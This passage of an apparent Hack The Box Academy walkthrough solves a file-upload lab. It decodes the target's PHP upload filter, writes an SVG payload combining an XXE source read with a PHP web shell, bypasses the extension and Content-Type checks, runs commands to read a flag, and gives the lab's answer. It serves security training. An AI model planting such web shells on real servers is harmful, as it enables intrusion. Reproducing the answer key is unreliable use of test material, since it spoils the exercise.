echo 'PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K' | base64 -d
```

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~]
└──╼ [★]$ echo 'PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K' |base64 -d

<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
```

From the decoded output, students will know that the uploads directory is `./user_feedback_submissions/`, and that the uploaded file names are prepended with the date `ymd`, which adds the current year in short format, the current month, and the current day. With this information, students now need to upload a PHP web shell so that they can execute commands by creating an SVG file that contains it:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
```

Students can use `cat` to save the exploit into a file:

Code: shell

```shell
cat << 'EOF' > shell.phar.svg
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
EOF
```

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~]
└──╼ [★]$ cat << 'EOF' > shell.phar.svg
> <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
> EOF
```

Subsequently, since the frontend does not allow `.svg` extensions, students need to change it to `.jpeg`:

Code: shell

```shell
mv shell.phar.svg shell.phar.jpeg
```

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~]
└──╼ [★]$ mv shell.phar.svg shell.phar.jpeg
```

![File_Upload_Attacks_Walkthrough_Image_49.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_49.png)

Within the intercepted request, students need to change back the extension to `.svg` for filename and make `Content-Type` to be `image/svg+xml`:

![File_Upload_Attacks_Walkthrough_Image_50.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_50.png)

After forwarding the request, students need to navigate to `http://STMIP:STMPO/contact/user_feedback_submissions/YMD_shell.phar.svg` and use the `cmd` URL parameter to execute commands, as in `http://STMIP:STMPO/contact/user_feedback_submissions/YMD_shell.phar.svg?cmd=ls+/`:

![File_Upload_Attacks_Walkthrough_Image_51.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_51.png)

Students will notice that the flag file exists in the root directory with the name `flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt`, thus they need to fetch its contents, as in `http://STMIP:STMPO/contact/user_feedback_submissions/YMD_shell.phar.svg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt`:

![File_Upload_Attacks_Walkthrough_Image_52.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_52.png)

Answer: `HTB{m4573r1ng_upl04d_3xpl0174710n}`